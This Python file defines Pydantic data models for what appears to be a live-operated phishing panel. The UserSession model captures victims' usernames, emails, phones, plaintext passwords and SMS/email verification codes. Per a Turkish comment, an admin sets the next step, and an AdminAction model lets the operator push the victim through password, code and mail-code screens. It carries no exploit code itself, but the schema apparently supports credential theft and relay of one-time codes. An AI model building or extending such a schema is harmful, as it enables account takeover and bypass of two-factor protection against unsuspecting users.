from pydantic import BaseModel, Field
from typing import Optional
from datetime import datetime
import uuid

class StatusCheck(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    client_name: str
    timestamp: datetime = Field(default_factory=datetime.utcnow)

class StatusCheckCreate(BaseModel):
    client_name: str

class UserSession(BaseModel):
    session_id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    username: Optional[str] = None
    amount: Optional[int] = None
    email: Optional[str] = None
    phone: Optional[str] = None
    password: Optional[str] = None
    phone_code: Optional[str] = None
    email_code: Optional[str] = None
    current_step: str = "home"  # home, contact, waiting, password, phone_verify, email_verify, success
    next_action: Optional[str] = None  # Admin tarafından belirlenen sonraki aksiyon
    ip: Optional[str] = None
    timestamp: datetime = Field(default_factory=datetime.utcnow)

class StepData(BaseModel):
    session_id: str
    step: str
    data: dict

class AdminAction(BaseModel):
    session_id: str
    action: str  # password, form, code, mail, mail_code, finish